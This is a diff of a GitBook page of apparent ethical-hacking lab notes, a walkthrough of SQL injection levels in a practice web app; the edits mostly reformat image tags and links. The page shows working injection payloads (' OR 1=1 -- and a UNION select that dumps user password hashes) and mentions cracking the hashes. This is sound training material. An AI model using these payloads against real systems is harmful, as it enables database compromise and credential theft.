@@ -52,25 +52,17 @@ in the where condition there're a first search to user with this id '' OR a true
 
 This permit us to see all DB results:
 
-<div align="left">
-
-<figure><img src="../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure>
-
-</div>
+<div align="left"><figure><img src="../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure></div>
 
 #### 2nd Payload
 
-Regarding that query selects: first\_name, last\_name field from users table, we can use [UNION](https://www.w3schools.com/sql/sql\_union.asp) operator to add a new query:  `' UNION select first_name,password from users --`&#x20;
+Regarding that query selects: first\_name, last\_name field from users table, we can use [UNION](https://www.w3schools.com/sql/sql_union.asp) operator to add a new query:  `' UNION select first_name,password from users --`&#x20;
 
 ```sql
 SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT first_name,password FROM users -- ';
 ```
 
-<div align="left">
-
-<figure><img src="../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>
-
-</div>
+<div align="left"><figure><img src="../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure></div>
 
 We obtain hash of psw to eventually crack using tools such as: [Hashcat](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/hashcat) and [John The Ripper](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/john-the-ripper).
 
@@ -84,11 +76,7 @@ The input is not sanitized, so I can execute any (potentially malicious) command
 
 Here, there're a select with range (1 to 5) to set User ID.
 
-<div align="left">
-
-<figure><img src="../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>
-
-</div>
+<div align="left"><figure><img src="../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure></div>
 
 In addition to low level, in the code below there're an escape string control and query variable $ID isn't enclosed by ''.
 
@@ -118,7 +106,7 @@ in the where condition there're a first search to user with this id '' OR a true
 
 #### 2nd Payload
 
-How the low level, regarding that query selects: first\_name, last\_name field from users table, we can use [UNION](https://www.w3schools.com/sql/sql\_union.asp) operator to add a new query:  1 `UNION select first_name,password from users --`&#x20;
+How the low level, regarding that query selects: first\_name, last\_name field from users table, we can use [UNION](https://www.w3schools.com/sql/sql_union.asp) operator to add a new query:  1 `UNION select first_name,password from users --`&#x20;
 
 ```sql
 SELECT first_name, last_name FROM users WHERE user_id = 1 UNION SELECT first_name,password FROM users -- ';
@@ -142,11 +130,7 @@ In this level clicking on first page, we obtain a redirect to a second page to s
 
 <figure><img src="../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>
 
-<div align="left">
-
-<figure><img src="../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure>
-
-</div>
+<div align="left"><figure><img src="../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure></div>
 
 #### 1st Payload
 
@@ -160,21 +144,17 @@ SELECT first_name, last_name FROM users WHERE user_id = '1' OR 1=1 -- ';
 
 that permit us to see all DB results:
 
-<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (39) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### 2nd Payload
 
-How last levels, we can use [UNION](https://www.w3schools.com/sql/sql\_union.asp) operator to add a new query:  `' UNION select first_name,password from users --`&#x20;
+How last levels, we can use [UNION](https://www.w3schools.com/sql/sql_union.asp) operator to add a new query:  `' UNION select first_name,password from users --`&#x20;
 
 ```sql
 SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT first_name,password FROM users -- ';
 ```
 
-<div align="left">
-
-<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
-
-</div>
+<div align="left"><figure><img src="../.gitbook/assets/image (40) (1).png" alt=""><figcaption></figcaption></figure></div>
 
 We obtain hash of psw to eventually crack using tools such as: [Hashcat](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/hashcat) and [John The Ripper](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/john-the-ripper).
 
